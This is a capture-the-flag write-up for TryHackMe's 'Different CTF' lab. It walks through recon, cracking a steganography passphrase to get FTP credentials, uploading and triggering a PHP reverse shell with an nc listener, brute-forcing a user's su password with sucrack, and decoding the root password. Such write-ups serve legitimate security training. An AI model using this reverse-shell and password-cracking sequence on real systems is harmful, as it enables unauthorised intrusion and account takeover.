# Different_CTF
TryHackMe Different CTF -- Writeup
Link to room https://tryhackme.com/room/adana

## Lets go

```
export IP=10.10.82.1
```

## Nmap

#### Scan

```
nmap -p21,80 -sV -sC -Pn -T4 -oA 10.10.82.1 10.10.82.1
```

#### Result

```
21/tcp open  ftp     vsftpd 3.0.3
80/tcp open  http    Apache httpd 2.4.29 (WordPress 5.6)

Service Info: OS: Unix
```

## Task 1a

Open ports

```
2
``` 

## Gobuster

#### Scan

```
gobuster dir -u http://$IP/ -w /usr/share/wordlists/dirb/common.txt -x php,html 
```

#### Results

```
/*************        (Status: 301) [Size: 316] [--> http://10.10.82.1/*************/]
/index.php            (Status: 301) [Size: 0] [--> http://10.10.82.1/]                
/index.php            (Status: 301) [Size: 0] [--> http://10.10.82.1/]                
/javascript           (Status: 301) [Size: 313] [--> http://10.10.82.1/javascript/]   
/phpmyadmin           (Status: 301) [Size: 313] [--> http://10.10.82.1/phpmyadmin/]   
/readme.html          (Status: 200) [Size: 7278]                                      
/server-status        (Status: 403) [Size: 275]                                       
/wp-admin             (Status: 301) [Size: 311] [--> http://10.10.82.1/wp-admin/]     
/wp-blog-header.php   (Status: 200) [Size: 0]                                         
/wp-content           (Status: 301) [Size: 313] [--> http://10.10.82.1/wp-content/]   
/wp-config.php        (Status: 200) [Size: 0]                                         
/wp-cron.php          (Status: 200) [Size: 0]                                         
/wp-includes          (Status: 301) [Size: 314] [--> http://10.10.82.1/wp-includes/]  
/wp-login.php         (Status: 200) [Size: 6544]                                      
/wp-mail.php          (Status: 403) [Size: 2672]                                      
/wp-load.php          (Status: 200) [Size: 0]                                         
/wp-links-opml.php    (Status: 200) [Size: 224]                                       
/wp-trackback.php     (Status: 200) [Size: 135]                                       
/wp-settings.php      (Status: 500) [Size: 0]                                         
/wp-signup.php        (Status: 302) [Size: 0] [--> http://adana.thm/wp-login.php?action=register]
/xmlrpc.php           (Status: 405) [Size: 42] 
```

## Task 1b

Secret directory

```
/*************/
```

## Visiting the url

```
http://$IP/*************
```

Two files are present, a jpg and wordlist.txt. Therefore we can assume its a steganography task (hidden data inside image)

##### Installing steghide

```
sudo apt-get install steghide -y
```

#### Checking the file using steghide

```
steghide info austrailian-bulldog-ant.jpg 
"austrailian-bulldog-ant.jpg":
  format: jpeg
  capacity: 3.6 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
```
As you can see the file requires a pass phrase. Therefore we'll need to crack it using stegseed

##### Installing stegseed

Download the latest release from:

```
https://github.com/RickdeJager/stegseek/releases
```
## Using stegseed

#### Command 

```
stegseek austrailian-bulldog-ant.jpg wordlist.txt 
```

#### Results

```
Found passphrase: "****************"
```
## Extracting embedded data

#### Steghide command

```
steghide extract -sf austrailian-bulldog-ant.jpg
```

#### Viewing user-pass-ftp.txt

```
RlRQLU********************FuZnRwClBBU1M6IDEyM2FkYW5hY3JhY2s=
```

#### Decoding the data

```
cat user-pass-ftp.txt | base64 -d
```

```
FTP-LOGIN
USER: *******
PASS: ************** 
```
## Connectting to ftp

Using the credentials that we just decoded

#### Listing the directory

```
ftp> passive
Passive mode on.
ftp> ls
227 Entering Passive Mode (10,10,82,1,146,77).
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Jan 14 16:49 **************
-rw-r--r--    1 1001     1001          405 Feb 06  2020 index.php
-rw-r--r--    1 1001     1001        19915 Feb 12  2020 license.txt
-rw-r--r--    1 1001     1001         7278 Jun 26  2020 readme.html
-rw-r--r--    1 1001     1001         7101 Jul 28  2020 wp-activate.php
drwxr-xr-x    9 1001     1001         4096 Dec 08 22:13 wp-admin
-rw-r--r--    1 1001     1001          351 Feb 06  2020 wp-blog-header.php
-rw-r--r--    1 1001     1001         2328 Oct 08  2020 wp-comments-post.php
-rw-r--r--    1 0        0            3194 Jan 11 09:55 wp-config.php
drwxr-xr-x    4 1001     1001         4096 Dec 08 22:13 wp-content
-rw-r--r--    1 1001     1001         3939 Jul 30  2020 wp-cron.php
drwxr-xr-x   25 1001     1001        12288 Dec 08 22:13 wp-includes
-rw-r--r--    1 1001     1001         2496 Feb 06  2020 wp-links-opml.php
-rw-r--r--    1 1001     1001         3300 Feb 06  2020 wp-load.php
-rw-r--r--    1 1001     1001        49831 Nov 09 10:53 wp-login.php
-rw-r--r--    1 1001     1001         8509 Apr 14  2020 wp-mail.php
-rw-r--r--    1 1001     1001        20975 Nov 12 14:43 wp-settings.php
-rw-r--r--    1 1001     1001        31337 Sep 30  2020 wp-signup.php
-rw-r--r--    1 1001     1001         4747 Oct 08  2020 wp-trackback.php
-rw-r--r--    1 1001     1001         3236 Jun 08  2020 xmlrpc.php
226 Directory send OK.
```
#### Uploading a shell

You can download a php-reverse-shell.php from pentestmonkey (make the required edits to ip addr)
Link: https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

```
put php-reverse-shell.php
chmod +x php-reverse-shell.php
chmod 777 php-reverse-shell.php
```
Note that after this if we try to access the file at $IP/php-reverse-shell.php, our nc listener doesn't catch anything.
Something is wrong and we must analyze further.

#### Downloading config file

```
ftp> get
(remote-file) wp-config.php
(local-file) wp-config.php
local: wp-config.php remote: wp-config.php
227 Entering Passive Mode (10,10,82,1,134,74).
150 Opening BINARY mode data connection for wp-config.php (3194 bytes).
226 Transfer complete.
3194 bytes received in 0.00 secs (3.1114 MB/s)
```
## Accessing url

The url /wp-config.php is inaccessible directly therfore we downloaded the config file. Let's see if we can find something interesting that will lead us to uploading our reverse shell.

#### Reading config file

```
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', '***********' );

/** MySQL database username */
define( 'DB_USER', '**********' );

/** MySQL database password */
define( 'DB_PASSWORD', '*****' );
```
#### Logging in 

Using the credentials above

```
$IP/**********
```
#### Accessing the url

We'll find that the wordpress site is actually running on a subdomain and that's where our shell got uploaded.

phpmyadmin1 > wp_options > siteurl

Adding it to /etc/hosts

```
$IP *********.adana.thm
```

## Getting reverse shell

Start a netcat listener 

```
rlwrap nc -lvnp 4444
```

#### Triggering the shell

Visit the url http://*********.adana.thm/php-reverse-shell.php

#### Stabilizing the shell

```
python -c 'import pty;pty.spawn("/bin/bash")'
```
## Task 2a

Web flag

```
cd html
www-data@ubuntu:/var/www/html$ cat wwe3bbfla4g.txt
```
## Task 2b 

#### Download sucrack to host machine 

```
git clone https://github.com/hemp3l/sucrack.git
```

#### Create a tar file

```
tar -zcvf sucrack.tar.gz ./sucrack 
```

Now send using python http server and download on the target machine

#### Installing sucrack

```
chmod -R 777 sucrack.tar.gz
tar -zxvf sucrack.tar.gz
cd sucrack
./configure
make
```

#### Creating custom wordlist

On your host machine modify the old wordlist by adding the prefix 123adana to all the words.

```
sed 's/^/123adana/' /var/www/html/announcements/wordlist.txt > newlist.txt
```

Send this newlist to the target machine using a python http server.

#### Run sucrack

```
./sucrack -u hakanbey -w 100 newlist.txt.1
```
#### Result

```
password is: **************
```
#### Switch user

```
su hakanbey
```

#### Retrieve flag

```
cd /home/hakanbey
cat user.txt
```
## Task 2b

```
THM{********************************}
```

#### Scanning for suid

```
find / -perm -4000 -type f 2>/dev/null
```

#### Results

```
/bin/fusermount
/bin/su
/bin/umount
/bin/mount
/bin/ping
/usr/local/bin/sudo
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/chsh
/usr/bin/arping
/usr/bin/pkexec
/usr/bin/traceroute6.iputils
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/binary
/usr/bin/at
/usr/bin/newgrp
/usr/sbin/pppd
/usr/sbin/exim4
```

#### Perform ltrace

```
ltrace /usr/bin/binary
strcat("war", "zone")                            = "*******"
strcat("warzone", "in")                          = "*********"
strcat("warzonein", "ada")                       = "************"
strcat("warzoneinada", "na")                     = "**************"
printf("I think you should enter the cor"...)    = 52
__isoc99_scanf(0x556bcaca5edd, 0x7ffe20205f30, 0, 0I think you should enter the correct string here ==>
```

#### Running /usr/bin/binary

```
/usr/bin/binary
**************
Hint! : Hexeditor 00000020 ==> ???? ==> /home/hakanbey/Desktop/root.jpg (CyberChef)

Copy /root/root.jpg ==> /home/hakanbey/root.jpg
```

Transfer the jpg to host machine using command:

```
python -m SimpleHTTPServer 8000
```

#### Run hexeditor

Copy the following line
```
00000020  FE E9 9D 3D  79 18 5F FC  ** ** ** **  ** ** ** ** 
```

#### Use icyberchef

Link: http://icyberchef.com/

Recipe: From Hex to Base85

```
root:***************
```

#### Su root

Enter the password generated

## Task 2c

```
THM{********************************}
```
